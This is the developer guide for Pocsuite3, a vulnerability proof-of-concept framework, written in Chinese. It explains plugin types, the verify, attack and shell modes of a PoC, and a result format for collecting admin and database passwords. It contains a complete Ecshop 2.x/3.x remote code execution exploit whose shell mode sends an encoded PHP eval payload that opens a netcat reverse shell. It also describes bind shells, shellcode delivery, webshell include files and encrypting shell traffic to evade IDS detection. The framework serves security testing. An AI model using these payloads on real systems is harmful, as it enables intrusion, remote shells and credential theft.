Pocsuite3 开发文档及 PoC 编写规范及要求说明
---
* [概述](#overview)
* [插件编写规范](#write_plugin)
  * [TARGETS 类型插件](#plugin_targets)
  * [POCS 类型插件](#plugin_pocs)
  * [RESULTS 类型插件](#plugin_results)
* [PoC 编写规范](#write_poc)
  * [PoC python 脚本编写步骤](#pocpy)
  * [可自定义参数的 PoC](#可自定义参数的插件<div-id="plugin_div"></div>)
  * [PoC 编写注意事项](#attention)
  * [Pocsuite3 远程调用文件列表](#inclue_files)
  * [通用API列表](#common_api)
    * [通用方法](#api_common)
    * [参数调用](#api_params)
  * [PoC 代码示例](#PoCexample)
    * [PoC Python 代码示例](#pyexample)
* [Pocsuite3 集成调用](#pocsuite_import)
* [PoC 规范说明](#PoCstandard)
  * [PoC 编号说明](#idstandard)
  * [PoC 命名规范](#namedstandard)
  * [PoC 第三方模块依赖说明](#requires)
  * [PoC 结果返回规范](#resultstandard)
    * [extra 字段说明](#result_extara)
    * [通用字段说明](#result_common)
  * [漏洞类型规范](#vulcategory)


### 概述<div id="overview"></div>
 本文档为 Pocsuite3 插件及 PoC 脚本编写规范及要求说明，包含了插件、PoC 脚本编写的步骤以及相关 API 的一些说明。一个优秀的 PoC 离不开反复的调试、测试，在阅读本文档前，请先阅读 [《Pocsuite3 使用文档》](./USAGE.md)。或参考 https://paper.seebug.org/904/ 查看 Pocsuite3 的一些新特性。

### 插件编写规范<div id="write_plugin"></div>
Pocsuite3 共有三种类型的插件，定义在 `pocsuite3.lib.core.enums.PLUGIN_TYPE` 中。

#### TARGETS 类型插件<div id="plugin_targets"></div>
TARGETS 类型插件用来自定义在系统初始化时候加载检测目标的功能，例如从 redis 或数据库加载 targets

```python
from pocsuite3.api import PluginBase
from pocsuite3.api import PLUGIN_TYPE
from pocsuite3.api import logger
from pocsuite3.api import register_plugin

class TargetPluginDemo(PluginBase):
    category = PLUGIN_TYPE.TARGETS
    
    def init(self):
        targets = ['www.a.com', 'www.b.com']  # load from redis, database ...
        count = 0
            for target in targets:
                if self.add_target(target):
                    count += 1

        info_msg = "[PLUGIN] get {0} target(s) from demo".format(count)
        logger.info(info_msg)


register_plugin(TargetPluginDemo)
```

#### POCS 类型插件<div id="plugin_pocs"></div>
POCS 类型插件用来自定义在系统初始化时候加载 PoC 脚本的功能，例如从 redis 或数据库加载 PoC 脚本代码

```python
from pocsuite3.api import PluginBase
from pocsuite3.api import PLUGIN_TYPE
from pocsuite3.api import logger
from pocsuite3.api import register_plugin

class TargetPluginDemo(PluginBase):
    category = PLUGIN_TYPE.POCS
    
    def init(self):
        pocs = [POC_CODE_1, POC_CODE_2]  # load PoC code from redis, database ...
        count = 0
            for poc in pocs:
                if poc and self.add_poc(poc):
                    count += 1

        info_msg = "[PLUGIN] get {0} poc(s) from demo".format(count)
        logger.info(info_msg)


register_plugin(TargetPluginDemo)
```

#### RESULTS 类型插件<div id="plugin_results"></div>
RESULTS 类型插件用来自定义检测结果的导出，例如导出 html 报表等

```python
from pocsuite3.api import PluginBase
from pocsuite3.api import PLUGIN_TYPE
from pocsuite3.api import logger
from pocsuite3.api import get_results
from pocsuite3.api import register_plugin

class HtmlReport(PluginBase):
    category = PLUGIN_TYPE.RESULTS

    def init(self):
        debug_msg = "[PLUGIN] html_report plugin init..."
        logger.debug(debug_msg)

    def start(self):
        # TODO
        # Generate html report

        for result in get_results():
            pass

        info_msg = '[PLUGIN] generate html report done.'
        logger.info(info_msg)

register_plugin(HtmlReport)

```

若需要实时的保存结果，需要申明 `handle` 来处理，可参考 https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/plugins/file_record.py 的写法。

### PoC 编写规范<div id="write_poc"></div>

#### PoC python 脚本编写步骤<div id="pocpy"></div>

本小节介绍 PoC python 脚本编写

Pocsuite3 仅支持 Python 3.x，如若编写 Python3 格式的 PoC，需要开发者具备一定的 Python3 基础

1. 首先新建一个 `.py` 文件，文件名应当符合 [《PoC 命名规范》](#namedstandard)


2. 编写 PoC 实现类 `DemoPOC`，继承自 `PoCBase` 类.

```python
from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str

  class DemoPOC(POCBase):
    ...
```

3. 填写 PoC 信息字段，**请认真填写所有基本信息字段**
```python
    vulID = '99335'  # Seebug 漏洞收录ID，如果没有则为0
    version = '1'  # PoC 的版本，默认为1
    author = 'seebug'  # PoC 的作者
    vulDate = '2021-8-18'  # 漏洞公开日期 (%Y-%m-%d)
    createDate = '2021-8-20'  # PoC 编写日期 (%Y-%m-%d)
    updateDate = '2021-8-20'  # PoC 更新日期 (%Y-%m-%d)
    references = ['https://www.seebug.org/vuldb/ssvid-99335']  # 漏洞来源地址，0day 不用写
    name = 'Fortinet FortiWeb 授权命令执行 (CVE-2021-22123)'  # PoC 名称，建议命令方式：<厂商> <组件> <版本> <漏洞类型> <cve编号>
    appPowerLink = 'https://www.fortinet.com'  # 漏洞厂商主页地址
    appName = 'FortiWeb'  # 漏洞应用名称
    appVersion = '<=6.4.0'  # 漏洞影响版本
    vulType = 'Code Execution'  # 漏洞类型，参见漏洞类型规范表
    desc = '/api/v2.0/user/remoteserver.saml接口的name参数存在命令注入'  # 漏洞简要描述
    samples = ['http://192.168.1.1']  # 测试样列，就是用 PoC 测试成功的目标
    install_requires = ['BeautifulSoup4:bs4']  # PoC 第三方模块依赖，请尽量不要使用第三方模块，必要时请参考《PoC第三方模块依赖说明》填写
    pocDesc = ''' poc的用法描述 '''
    dork = {'zoomeye': 'deviceState.admin.hostname'}  # 搜索 dork，如果运行 PoC 时不提供目标且该字段不为空，将会调用插件从搜索引擎获取目标。
    suricata_request = '''http.uri; content: "/api/v2.0/user/remoteserver.saml";'''  # 请求流量 suricata 规则
    suricata_response = ''  # 响应流量 suricata 规则
```

4. 编写验证模式

```python
  def _verify(self):
        output = Output(self)
        # 验证代码
        if result:  # result是返回结果
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
```

5. 编写攻击模式

攻击模式可以对目标进行 getshell，查询管理员帐号密码等操作，定义它的方法与检测模式类似
```python
def _attack(self):
    output = Output(self)
    result = {}
    # 攻击代码
```

和验证模式一样，攻击成功后需要把攻击得到结果赋值给 result 变量

**注意：如果该 PoC 没有攻击模式，可以在 \_attack() 函数下加入一句 return self.\_verify() 这样你就无需再写 \_attack 函数了。**

6. 编写shell模式 [**new**]

Pocsuite3 在 shell 模式会默认监听 `6666` 端口，编写对应的攻击代码，让目标执行反向连接运行 Pocsuite3 系统 IP 的 `6666` 端口即可得到一个 shell
```python
def _shell(self):
    cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
    # 攻击代码 execute cmd
```

shell 模式下，只能运行单个 PoC 脚本，控制台会进入 shell 交互模式执行命令及输出

从 ***1.8.5*** 版本开始，Pocsuite3 支持 bind shell。shell 模式和原来的操作方式一致，也需要指定监听 ip 和端口，监听 ip 可以是本地任意 ip，也可以是远程 vps ip。

bind shell 的实现位于 `./pocsuite3/modules/listener/bind_tcp.py`，原理是实现了一个中间层，一端连接漏洞目标的 bind shell（如 telnet 服务、nc 启动的 shell、php 一句话等），另一端连接用户指定的监听 ip 和端口，如此一来，shell 模式可以不受网络环境限制，支持在内网使用。

目前支持三种 bind shell，使用场景如下：

`bind_shell`：通用方法，在 shell 模式中直接调用 `return bind_shell(self, rce_func)` 即可，非常便捷。针对有回显的漏洞，在 PoC 中实现一个 rce（函数名可自定义）方法，函数参数为命令输入，输出为命令输出。如果漏洞无回显，也可以通过写一句话转为有回显的。值得一提的是，用户也可以在 rce 方法中实现流量的加解密以逃避 IDS 检测。

`bind_tcp_shell`：对 tcp 绑定型 shell 的原生支持，在 shell 模式中 `return bind_tcp_shell(bind_shell_ip, bind_shell_port)`

`bind_telnet_shell`：对 telnet 服务的原生支持，在 shell 模式中 `return bind_telnet_shell(ip, port, username, password)`

从 ***1.8.6*** 版本开始，Pocsuite3 支持加密的 shell。PoC 中使用 openssl 的反弹命令（也可以用代码反弹），并且在运行时指定 `--tls` 选项。

7. 结果返回

不管是验证模式或者攻击模式，返回结果 result 中的 key 值必须按照下面的规范来写，result 各字段意义请参见[《PoC 结果返回规范》](#resultstandard)

```
'Result':{
   'DBInfo' :   {'Username': 'xxx', 'Password': 'xxx', 'Salt': 'xxx' , 'Uid':'xxx' , 'Groupid':'xxx'},
   'ShellInfo': {'URL': 'xxx', 'Content': 'xxx' },
   'FileInfo':  {'Filename':'xxx','Content':'xxx'},
   'XSSInfo':   {'URL':'xxx','Payload':'xxx'},
   'AdminInfo': {'Uid':'xxx' , 'Username':'xxx' , 'Password':'xxx' }
   'Database':  {'Hostname':'xxx', 'Username':'xxx',  'Password':'xxx', 'DBname':'xxx'},
   'VerifyInfo':{'URL': 'xxx' , 'Postdata':'xxx' , 'Path':'xxx'}
   'SiteAttr':  {'Process':'xxx'}
   'Stdout': 'result output string'
}
```

output 为 Pocsuite3 标准输出 API，如果要输出调用成功信息则使用 `output.success(result)`，如果要输出调用失败则 `output.fail()`，系统自动捕获异常，不需要 PoC 里处理捕获，如果 PoC 里使用 try...except 来捕获异常，可通过`output.error('Error Message')` 来传递异常内容，建议直接使用模板中的 parse_output 通用结果处理函数对 _verify 和 _attack 结果进行处理。
```
def _verify(self, verify=True):
    result = {}
    ...

    return self.parse_output(result)

def parse_output(self, result):
    output = Output(self)
    if result:
        output.success(result)
    else:
        output.fail()
    return output
```

8. 注册 PoC 实现类

在类的外部调用 register_poc() 方法注册 PoC 类
```
class DemoPOC(POCBase):
    # POC内部代码

# 注册 DemoPOC 类
register_poc(DemoPOC)
```

#### 可自定义参数的 PoC<div id="plugin_div"></div>
如果你需要编写一个可以交互参数的 PoC 文件(例如有的 PoC 脚本需要填写登录信息，或者任意命令执行时执行任意命令)，那么可以在 PoC 文件中声明一个 `_options` 方法。一个简单的例子如下：

```python
from collections import OrderedDict

from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, VUL_TYPE
from pocsuite3.api import OptString


class DemoPOC(POCBase):
    vulID = '0'  # ssvid
    version = '1.0'
    author = ['seebug']
    vulDate = '2019-2-26'
    createDate = '2019-2-26'
    updateDate = '2019-2-25'
    references = ['']
    name = '自定义命令参数登录例子'
    appPowerLink = 'http://www.knownsec.com/'
    appName = 'test'
    appVersion = 'test'
    vulType = VUL_TYPE.XSS
    desc = '''这个例子说明了你可以使用console模式设置一些参数或者使用命令中的'--'来设置自定义的参数'''
    samples = []
    category = POC_CATEGORY.EXPLOITS.WEBAPP

    def _options(self):
        o = OrderedDict()
        o["username"] = OptString('', description='这个poc需要用户登录，请输入登录账号', require=True)
        o["password"] = OptString('', description='这个poc需要用户密码，请输出用户密码', require=False)
        return o

    def _verify(self):
        result = {}
        payload = "username={0}&password={1}".format(self.get_option("username"), self.get_option("password"))
        r = requests.post(self.url, data=payload)
        if r.status_code == 200:
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['VerifyInfo']['Postdata'] = payload

        return self.parse_output(result)

    def _attack(self):
        return self._verify()

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output


register_poc(DemoPOC)
```

它可以使你在 `console` 或者 `cli` 模式下调用。

- 在 console 模式下，Pocsuite3 模仿了 msf 的操作模式，你只需要使用 `set` 命令来设置相应的参数，然后 `run` 或者 `check` 来执行(`attack` 和 `shell` 命令也可以)。
- 在 cli 模式下，如上面例子所示，定义了 `username` 和 `password` 两个字段，你可以在参数后面加上 `--username test --password test` 来调用执行，需要注意的是，如果你的参数中包含了空格，用双引号 `"` 来包裹它。

##### 自定义字段

像其他工具一样，如果你想使用自定义的字段，将它定义到 `_options` 方法中，然后返回一个数组。如果在 PoC 文件中想调用自定义字段，需要提前引入：

```python
from pocsuite3.api import OptString, OptDict, OptIP, OptPort, OptBool, OptInteger, OptFloat, OptItems
```

| 字段类型   | 字段描述                                                     | 参数解释                                                     | 相关例子 |
| ---------- | ------------------------------------------------------------ | ------------------------------------------------------------ | -------- |
| OptString  | 接收字符串类型参数                                           | default: 传入一个默认值<br />descript: 字段描述，默认为空<br />require: 是否必须，默认False |          |
| OptDict    | 接收一个字典类型参数，在选择上如果选择key，调用时会调用对应的value | default: 传入一个默认值<br />descript: 字段描述，默认为空<br />require: 是否必须，默认False |          |
| OptIP      | 接收IP类型的字符串                                           | default: 传入一个默认值<br />descript: 字段描述，默认为空<br />require: 是否必须，默认False |          |
| OptPort    | 接收端口类型参数                                             | default: 传入一个默认值<br />descript: 字段描述，默认为空<br />require: 是否必须，默认False |          |
| OptBool    | 接收布尔类型参数                                             | default: 传入一个默认值<br />descript: 字段描述，默认为空<br />require: 是否必须，默认False |          |
| OptInteger | 接收整数类型参数                                             | default: 传入一个默认值<br />descript: 字段描述，默认为空<br />require: 是否必须，默认False |          |
| OptFloat   | 接收浮点数类型参数                                           | default: 传入一个默认值<br />descript: 字段描述，默认为空<br />require: 是否必须，默认False |          |
| OptItems   | 接收list类型参数                                             | default: 传入一个默认值<br />selectd: 默认选择<br />descript: 字段描述，默认为空<br />require: 是否必须，默认False |          |

需要注意的是，`console` 模式支持所有的参数类型，`cli` 模式除了`OptDict`、`OptBool`、`OptItems` 类型外都支持。

#### PoC 编写注意事项<div id="attention"></div>
1. 要求在编写 PoC 的时候，尽量的不要使用第三方模块，如果在无法避免的情况下，请认真填写 install_requires 字段，填写格式参考《PoC 第三方模块依赖说明》。
2. 要求编写 PoC 的时候，尽量的使用 Pocsuite3 已经封装的 API 提供的方法，避免自己重复造轮子，对于一些通用方法可以加入到 API，具体参考《通用 API 列表》。
3. 如果 PoC 需要包含远程文件等，统一使用 Pocsuite3 远程调用文件，具体可以参考[《Pocsuite3 远程调用文件列表》](#inclue_files)，不要引入第三方文件，如果缺少对应文件，联系管理员添加。
4. 要求每个 PoC 在编写的时候，尽可能的不要要求输入参数，这样定制化过高，不利于 PoC 的批量化调度执行，尽可能的 PoC 内部实现参数的构造，至少应该设置默认值，如某个 PoC 需要指定用户id，那么应该允许使用 extar_param 传入 id，也应该没有传入该参数的时候自动设置默认值，不应该影响 PoC 的正常运行与验证。
5. 要求每个 PoC 在输出结果的时候，尽可能的在不破坏的同时输出取证信息，如输出进程列表，具体参考[《PoC 结果返回规范》](#resultstandard)。
6. 要求认真填写 PoC 信息字段，其中 vulID 请填写 Seebug 上的漏洞 ID（不包含 SSV-）。
7. 为了防止误报产生以及避免被关键词被 WAF 等作为检测特征，要求验证结果判断的时候输出随机的字符串（可以调用 API 中的`random_str`方法），而不用采用固定字符串。
比如：  

```
检测 SQL 注入时：
    token = random_str()
    payload = 'select md5(%s)' % token
    ...

    if hashlib.new('md5', token).hexdigest() in content:
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url

检测 XSS 漏洞时：
    # 可参考 https://paper.seebug.org/1119/

    token = random_str()
    payload = 'alert("%s")' % token
    ...

    if payload in content:
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url

检测 PHP 文件上传是否成功：

    token = random_str()
    payload = '<?php echo md5("%s");unlink(__FILE__);?>' % token
    ...

    if hashlib.new('md5', token).hexdigest() in content:
        result['VerifyInfo'] = {}
        result['VerifyInfo']['URL'] = self.url
```

8. 任意文件如果需要知道网站路径才能读取文件的话，可以读取系统文件进行验证，要写 Windows 版和 Linux 版两个版本。
9. 检测模式下，上传的文件一定要删掉。
10. 程序可以通过某些方法获取表前缀，just do it；若不行，保持默认表前缀。
11. PoC 编写好后，务必进行测试，测试规则为：5 个不受漏洞影响的网站，确保 PoC 攻击不成功；5 个受漏洞影响的网站，确保 PoC 攻击成功

#### Pocsuite3 远程调用文件列表<div id="inclue_files"></div>
部分 PoC 需要采用包含远程文件的形式，要求基于 Pocsuite3 的 PoC 统一调用统一文件(如需引用未在以下文件列表内文件，请联系 404-team@knownsec.com 或者直接提交 issue)。
统一 URL 调用路径：`https://pocsuite.org/include_files/`，如 `https://pocsuite.org/include_files/xxe_verify.xml`

**文件列表**

|文件名|说明|
|-----|---|
|a.jsp|一个通用简单的 JSP 一句话 Shell，攻击模式|
|b.jsp|一个通用简单的 JSP 一句话 Shell，验证模式|
|php_attack.txt|PHP 一句话|
|php_verify.txt|PHP 打印 md5 值|
|xxe_verify.xml|XXE 验证文件|


#### 通用 API 列表<div id="common_api"></div>
在编写 PoC 的时候，相关方法请尽量调用通用的已封装的 API

**通用方法**<div id="api_common"></div>

|方法|说明|
|---|----|
|from pocsuite3.api import logger|日志记录，比如logger.log(info)|
|from pocsuite3.api import requests|请求类，用法同 requests|
|from pocsuite3.api import Seebug|Seebug api 调用|
|from pocsuite3.api import ZoomEye|ZoomEye api 调用|
|from pocsuite3.api import CEye|Ceye api 调用|
|from pocsuite3.api import crawl|简单爬虫功能|
|from pocsuite3.api import PHTTPServer|Http服务功能|
|from pocsuite3.api import REVERSE_PAYLOAD|反向连接shell payload|
|from pocsuite3.api import get_results|获取结果|

**参数调用**<div id="api_params"></div>

* self.headers 用来获取 http 请求头， 可以通过 --cookie, --referer，--user-agent，--headers 来修改和增加需要的部分
* self.params 用来获取 --extra-params 赋值的变量，Pocsuite3 会自动转化成字典格式，未赋值时为空字典
* self.url 用来获取 -u / --url 赋值的 URL，如果之前赋值是 baidu.com 这样没有协议的格式时， Pocsuite3 会自动转换成 http://baidu.com

##### ShellCode 生成支持

在一些特殊的 Linux 和 Windows 环境下，想得到反弹 shell 条件比较困难。为此我们制作了用于在 Windows/Linux x86 x64 环境下的用于反弹的 shellcode，并制作了接口支持，你在只需要拥有命令执行权限下便可以自动将 shellcode 写入到目标机器以及执行反弹 shell 命令。Demo Poc：https://github.com/knownsec/pocsuite3/blob/master/pocsuite3/pocs/thinkphp_rce2.py

```python
from pocsuite3.api import generate_shellcode_list
_list = generate_shellcode_list(listener_ip=get_listener_ip(), listener_port=get_listener_port(), os_target=OS.LINUX, os_target_arch=OS_ARCH.X86)
```

将生成一长串执行指令，执行这些指令便可以反弹出一个 shell。

##### HTTP 服务内置

对于一些需要第三方 HTTP 服务才能验证的漏洞，Pocsuite3 也提供对应的API，支持在本地开启一个 HTTP 服务方便进行验证。

可查看测试用例：https://github.com/knownsec/pocsuite3/blob/master/tests/test_httpserver.py

#### PoC 代码示例<div id="PoCexample"></div>

##### PoC Python 代码示例<div id="pyexample"></div>

[Ecshop 2.x/3.x Remote Code Execution](http://www.seebug.org/vuldb/ssvid-97343) PoC:

```
import base64
from urllib.parse import urljoin

from pocsuite3.api import Output, POCBase, register_poc, requests, logger
from pocsuite3.api import get_listener_ip, get_listener_port
from pocsuite3.api import REVERSE_PAYLOAD
from pocsuite3.lib.utils import random_str
from requests.exceptions import ReadTimeout


class DemoPOC(POCBase):
    vulID = '97343'  # ssvid
    version = '3.0'
    author = ['seebug']
    vulDate = '2018-06-14'
    createDate = '2018-06-14'
    updateDate = '2018-06-14'
    references = ['https://www.seebug.org/vuldb/ssvid-97343']
    name = 'Ecshop 2.x/3.x Remote Code Execution'
    appPowerLink = ''
    appName = 'ECSHOP'
    appVersion = '2.x,3.x'
    vulType = 'Romote Code Execution'
    desc = '''
    '''
    samples = []
    install_requires = ['']

    def _verify(self):
        result = {}
        path = "user.php?act=login"
        url = urljoin(self.url, path)
        echashs = [
            '554fcae493e564ee0dc75bdf2ebf94ca',  # ECShop 2.x hash
            '45ea207d7a2b68c49582d2d22adf953a'  # ECShop 3.x hash
        ]

        for echash in echashs:
            payload = ('{0}ads|a:2:{{s:3:"num";s:116:"*/ select 1,0x2720756E696F6E202F2A,3,4,5,'
                       '6,7,8,0x7b24616263275d3b6563686f20706870696e666f2f2a2a2f28293b2f2f7d,10'
                       '-- -";s:2:"id";s:10:"\' union /*";}}{0}').format(echash)
            headers = {"Referer": payload}
            try:
                resp = requests.get(url, headers=headers)
                if resp and resp.status_code == 200 and "<title>phpinfo()</title>" in resp.text:
                    result['VerifyInfo'] = {}
                    result['VerifyInfo']['URL'] = url
                    result['VerifyInfo']['Referer'] = payload
                    break
            except Exception as ex:
                pass

        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    def _attack(self):
        return self._verify()

    def _shell(self):
        path = "user.php"
        url = urljoin(self.url, path)
        echashs = [
            '554fcae493e564ee0dc75bdf2ebf94ca',  # ECShop 2.x hash
            '45ea207d7a2b68c49582d2d22adf953a'  # ECShop 3.x hash
        ]

        cmd = REVERSE_PAYLOAD.NC.format(get_listener_ip(), get_listener_port())
        phpcode = 'passthru("{0}");'.format(cmd)
        encoded_code = base64.b64encode(phpcode.encode())
        postdata = {
            'action': 'login',
            'vulnspy': 'eval/**/(base64_decode({0}));exit;'.format(encoded_code.decode()),
            'rnd': random_str(10)
        }

        for echash in echashs:
            payload = '{0}ads|a:3:{{s:3:"num";s:207:"*/ select 1,0x2720756e696f6e2f2a,3,4,5,6,7,8,0x7b247b2476756c6e737079275d3b6576616c2f2a2a2f286261736536345f6465636f646528275a585a686243676b5831425055315262646e5673626e4e77655630704f773d3d2729293b2f2f7d7d,0--";s:2:"id";s:9:"'"'"' union/*";s:4:"name";s:3:"ads";}}{1}'.format(echash, echash)
            headers = {"Referer": payload}
            try:
                resp = requests.post(url, data=postdata, headers=headers)
                if resp and resp.status_code == 200 and "<title>phpinfo()</title>" in resp.text:
                    break
            except ReadTimeout:
                break
            except Exception as ex:
                pass


register_poc(DemoPOC)

```


HttpServer Demo:

```python
"""
If you have issues about development, please read:
https://github.com/knownsec/pocsuite3/blob/master/docs/CODING.md
for more about information, plz visit https://pocsuite.org
"""
from http.server import SimpleHTTPRequestHandler

from pocsuite3.api import Output, POCBase, register_poc
from pocsuite3.api import PHTTPServer


class MyRequestHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        path = self.path
        status = 404
        count = 0

        xxe_dtd = '''xxx'''
        if path == "/xxe_dtd":
            count = len(xxe_dtd)
            status = 200
            self.send_response(status)
            self.send_header('Content-Type', 'text/html')
            self.send_header('Content-Length', '{}'.format(count))
            self.end_headers()
            self.wfile.write(xxe_dtd.encode())
            return
        self.send_response(status)
        self.send_header('Content-Type', 'text/html')
        self.send_header("Content-Length", "{}".format(count))
        self.end_headers()

    def do_HEAD(self):
        status = 404

        if self.path.endswith('jar'):
            status = 200
        self.send_response(status)
        self.send_header("Content-type", "text/html")
        self.send_header("Content-Length", "0")
        self.end_headers()


class DemoPOC(POCBase):
    vulID = ''  # ssvid
    version = '1.0'
    author = ['seebug']
    vulDate = '2018-03-08'
    createDate = '2018-04-12'
    updateDate = '2018-04-13'
    references = ['']
    name = ''
    appPowerLink = ''
    appName = ''
    appVersion = ''
    vulType = ''
    desc = '''
    '''
    samples = []
    install_requires = ['']

    def _verify(self):
        result = {}
        '''Simple http server demo
           default params:
           		bind_ip='0.0.0.0'
           		bind_port=666
           		is_ipv6=False
           		use_https=False
           		certfile=os.path.join(paths.POCSUITE_DATA_PATH, 'cacert.pem')
                requestHandler=BaseRequestHandler
           You can write your own handler, default list current directory
        '''
        httpd = PHTTPServer(requestHandler=MyRequestHandler)
        httpd.start()

        # Write your code
        return self.parse_output(result)

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output

    _attack = _verify


register_poc(DemoPOC)

```


### Pocsuite3 集成调用<div id="pocsuite_import"></div>

Pocsuite3 api 提供了集成调用` pocsuite3` 的全部功能函数，可参见测试用例 `tests/test_import_pocsuite_execute.py`。典型的集成调用方法如下：

```python
from pocsuite3.api import init_pocsuite
from pocsuite3.api import start_pocsuite
from pocsuite3.api import get_results


def run_pocsuite():
    # config 配置可参见命令行参数， 用于初始化 pocsuite3.lib.core.data.conf
    config = {
    'url': ['http://127.0.0.1:8080', 'http://127.0.0.1:21'],
    'poc': ['ecshop_rce', 'ftp_burst']
    }
    
    init_pocsuite(config)
    start_pocsuite()
    result = get_results()

```

### PoC 规范说明<div id="PoCstandard"></div>

#### PoC 编号说明<div id="idstandard"></div>
PoC 编号 ID 与漏洞 ID 一致.

示例，漏洞库中的漏洞统一采用 “SSV-xxx” 编号的方式，则 PoC 编号为 xxx


#### PoC 命名规范<div id="namedstandard"></div>

PoC 命名分成3个部分组成漏洞应用名_版本号_漏洞类型名称 然后把文件名称中的所有字母改成小写，所有的符号改成 `_`
文件名不能有特殊字符和大写字母，最后出来的文件名应该像这样：

```
    _1847_seeyon_3_1_login_info_disclosure.py
```
#### PoC 第三方模块依赖说明<div id="requires"></div>
PoC 编写的时候要求尽量不要使用第三方模块，如果必要使用，请在 PoC 的基础信息部分，增加 install_requires 字段，按照以下格式填写依赖的模块名：
```
install_requires =[str_item_, str_item, …] # 整个字段的值为 list，每个项为一个依赖模块
```

str_item 格式：模块名==版本号，模块名为 pip install 安装时的模块名（请不要填写 import 的模块名）

如果遇到安装时模块名与调用时的不一致情况，用 `:` 分割开，例如常见的加密算法库 `pycryptodome`，但是调用是以 `from Crypto.Cipher import AES`，此时就需要如下填写：

```python
install_requires = ['pycryptodome:Crypto']
```


#### PoC 结果返回规范<div id="resultstandard"></div>

result 为 PoC 返回的结果数据类型，result 返回值要求返回完整的一项，暂不符合 result 字段的情况，放入 extra 字段中，此步骤必须尽可能的保证运行者能够根据信息 复现/理解 漏洞，若果步骤复杂，在取证信息中说明。例如：

```python
  # 返回数据库管理员密码
  result['DBInfo']['Password']='xxxxx'
  # 返回 Webshell 地址
  result['ShellInfo']['URL'] = 'xxxxx'
  # 返回网站管理员用户名
  result['AdminInfo']['Username']='xxxxx'
```

**extra 字段说明**<div id="result_extara"></div>
extra 字段为通用结果字段的补充字段，如果需要返回的内容中不属于通用结果字段，那么可以使用 extra 字段进行赋值。extra 字段为 dict 格式，可自定义 key 进行赋值，如：
```
result['extra' ]['field'] = 'aa'
```

**特殊字段：** evidence，针对结果中返回取证信息，定义字段名只允许为 evidence，并且只能存储于 extar 字段，即：
```
result['extra' ]['evidence'] = 'aa'
```

**通用字段说明**<div id="result_common"></div>
```
result：[
    {  name: 'DBInfo'，        value：'数据库内容' }，
        {  name: 'Username'，      value: '管理员用户名'},
        {  name: 'Password'，      value：'管理员密码' }，
        {  name: 'Salt'，          value: '加密盐值'},
        {  name: 'Uid'，           value: '用户ID'},
        {  name: 'Groupid'，       value: '用户组ID'},

    {  name: 'ShellInfo'，     value: 'Webshell信息'},
        {  name: 'URL'，           value: 'Webshell地址'},
        {  name: 'Content'，       value: 'Webshell内容'},

    {  name: 'FileInfo'，      value: '文件信息'},
        {  name: 'Filename'，      value: '文件名称'},
        {  name: 'Content'，       value: '文件内容'},

    {  name: 'XSSInfo'，       value: '跨站脚本信息'},
        {  name: 'URL'，           value: '验证URL'},
        {  name: 'Payload'，       value: '验证Payload'},

    {  name: 'AdminInfo'，     value: '管理员信息'},
        {  name: 'Uid'，           value: '管理员ID'},
        {  name: 'Username'，      value: '管理员用户名'},
        {  name: 'Password'，      value: '管理员密码'},

    {  name: 'Database'，      value：'数据库信息' }，
        {  name: 'Hostname'，      value: '数据库主机名'},
        {  name: 'Username'，      value：'数据库用户名' }，
        {  name: 'Password'，      value: '数据库密码'},
        {  name: 'DBname'，        value: '数据库名'},

    {  name: 'VerifyInfo'，    value: '验证信息'},
        {  name: 'Target'，        value: '验证host:port'},
        {  name: 'URL'，           value: '验证URL'},
        {  name: 'Postdata'，      value: '验证POST数据'},
        {  name: 'Path'，          value: '网站绝对路径'},

    {  name: 'SiteAttr'，      value: '网站服务器信息'},
    {  name: 'Process'，       value: '服务器进程'}

    ]

```


#### 漏洞类型规范<div id="vulcategory"></div>

<table border=1>
    <tr><td>英文名称</td><td>中文名称</td><td>缩写</td></tr>
    <tr><td>Cross Site Scripting </td><td> 跨站脚本 </td><td> xss</td></tr>
    <tr><td>Cross Site Request Forgery </td><td> 跨站请求伪造 </td><td> csrf</td></tr>
    <tr><td>SQL Injection </td><td> Sql注入 </td><td> sql-inj</td></tr>
    <tr><td>LDAP Injection </td><td> ldap注入 </td><td> ldap-inj</td></tr>
    <tr><td>Mail Command Injection </td><td> 邮件命令注入 </td><td> smtp-inj</td></tr>
    <tr><td>Null Byte Injection </td><td> 空字节注入 </td><td> null-byte-inj</td></tr>
    <tr><td>CRLF Injection </td><td> CRLF注入 </td><td> crlf-inj</td></tr>
    <tr><td>SSI Injection </td><td> Ssi注入 </td><td> ssi-inj</td></tr>
    <tr><td>XPath Injection </td><td> Xpath注入 </td><td> xpath-inj</td></tr>
    <tr><td>XML Injection </td><td> Xml注入 </td><td> xml-inj</td></tr>
    <tr><td>XQuery Injection </td><td> Xquery 注入 </td><td> xquery-inj</td></tr>
    <tr><td>Command Execution </td><td> 命令执行 </td><td> cmd-exec</td></tr>
    <tr><td>Code Execution </td><td> 代码执行 </td><td> code-exec</td></tr>
    <tr><td>Remote File Inclusion </td><td> 远程文件包含 </td><td> rfi</td></tr>
    <tr><td>Local File Inclusion </td><td> 本地文件包含 </td><td> lfi</td></tr>
    <tr><td>Abuse of Functionality </td><td> 功能函数滥用 </td><td> func-abuse</td></tr>
    <tr><td>Brute Force </td><td> 暴力破解 </td><td> brute-force</td></tr>
    <tr><td>Buffer Overflow </td><td> 缓冲区溢出 </td><td> buffer-overflow</td></tr>
    <tr><td>Content Spoofing </td><td> 内容欺骗 </td><td> spoofing</td></tr>
    <tr><td>Credential Prediction </td><td> 证书预测 </td><td> credential-prediction</td></tr>
    <tr><td>Session Prediction </td><td> 会话预测 </td><td> session-prediction</td></tr>
    <tr><td>Denial of Service </td><td> 拒绝服务 </td><td> dos</td></tr>
